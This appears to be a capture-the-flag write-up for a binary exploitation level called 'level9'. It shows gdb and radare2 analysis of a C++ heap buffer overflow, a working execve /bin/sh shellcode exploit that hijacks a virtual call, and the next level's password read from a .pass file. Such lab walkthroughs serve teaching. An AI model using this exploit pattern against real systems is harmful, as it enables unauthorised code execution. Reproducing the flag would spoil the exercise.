@@ -1,0 +1,68 @@
+ ▄▄▄▄                                    ▄▄▄▄                  ▄▄▄▄
+ ▀▀██                                    ▀▀██                ▄██▀▀██▄
+   ██       ▄████▄   ██▄  ▄██   ▄████▄     ██                ██    ██
+   ██      ██▄▄▄▄██   ██  ██   ██▄▄▄▄██    ██                ▀██▄▄███
+   ██      ██▀▀▀▀▀▀   ▀█▄▄█▀   ██▀▀▀▀▀▀    ██                  ▀▀▀ ██
+   ██▄▄▄   ▀██▄▄▄▄█    ████    ▀██▄▄▄▄█    ██▄▄▄              █▄▄▄██
+    ▀▀▀▀     ▀▀▀▀▀      ▀▀       ▀▀▀▀▀      ▀▀▀▀               ▀▀▀▀
+
+Let's start by recreating the source code.
+First off, the program was made in C++.
+Secondly something weird is going on iin the constructor, but wathever.
+Finally: We can totaly overflow the buffer in N::setAnnotation !
+
+We are again using https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
+0x08048682 in main ()
+(gdb) i r
+eax            0x41366441
+(...)
+
+-> offset is 108
+
+Let's try to find where our buffer is stored.
+'n0' and 'n1' are the variable names I used in 'source.cpp'.
+
+(gdb) disas main
+(...)
+0x0804867c <+136>:   mov    0x10(%esp),%eax
+0x08048680 <+140>:   mov    (%eax),%eax
+0x08048682 <+142>:   mov    (%eax),%edx <= This is where we crashed with the buffer overflow
+(...)
+0x08048693 <+159>:   call   *%edx
+
+
+Using r2 we see (aaa;s main;pdc):
+[0x080485f4]> pdc
+   eax = dword [var_14h]         <= eax is set to '*n0'
+   dword [esp] = eax
+   method.N.setAnnotation_char()
+   eax = dword [var_10h]         <= eax is set to '*n1'
+   eax = dword [eax]             < {
+   edx = dword [eax]             <   The pointer is dreferenced and called ((***(fn)n1)(n1, n0);)
+   (...)                         <
+   edx ()                        < }
+
+(gdb) b *0x0804867c <= right after the function call / buffer overflow
+(gdb) r AAAA$(printf "B%0.s" $(seq 1 104))CCCC
+(gdb) x $eax
+0x804a00c:      0x41414141 # AAAA: the start of our input: the location of the buffer !
+(gdb) ni
+(gdb) x $eax
+0x804a078:      0x43434343 # CCCC: where we should write a pointer
+(gdb) continue
+Program received signal SIGSEGV, Segmentation fault.
+
+So, our buffer is at 0x0804a00c
+
+We use this shellcode: http://shell-storm.org/shellcode/files/shellcode-575.php
+
+[Address] - [ShellCode] - [Padding] - [Address]
+ 4 bytes  -  21 bytes   -  83 bytes -  4 bytes = 112 bytes
+The last address points to the first adress, which points to the shellcode
+
+./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '_'*83 + '\x0c\xa0\x04\x08'")
+
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
